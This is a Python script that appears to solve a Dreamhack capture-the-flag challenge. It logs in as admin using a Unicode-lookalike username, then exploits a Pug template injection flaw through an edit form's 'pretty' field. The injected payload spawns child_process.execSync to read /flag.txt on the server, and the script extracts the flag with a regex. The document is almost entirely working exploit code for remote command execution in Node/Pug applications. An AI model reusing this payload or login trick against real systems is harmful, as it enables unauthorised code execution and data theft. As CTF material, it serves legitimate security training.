import requests
import re

url = "http://host3.dreamhack.games:17039/"
s = requests.Session()

# admin login
res = s.post(f"{url}/login", data={
    "id": 'BıSC2023', 
    'pw': 'TeamH4C'
}) 

# pug cve
post = {
    'title': 'hacked',
    'content': "hacked",
}

res = s.post(f"{url}/write", data=post)

payload = "'+process.mainModule.require('child_process').execSync('cat /flag.txt').toString());_=('"

res = s.post(f'{url}/edit', data={
    'title': post['title'],
    'b_title': post['title'],
    'content': post['content'],
    'pretty': payload
})

res = s.get(f'{url}/note', params={
    'title': post['title']
})

flag = re.findall(r'(BISC2023{.+})', res.text)[0]
print("Flag:", flag)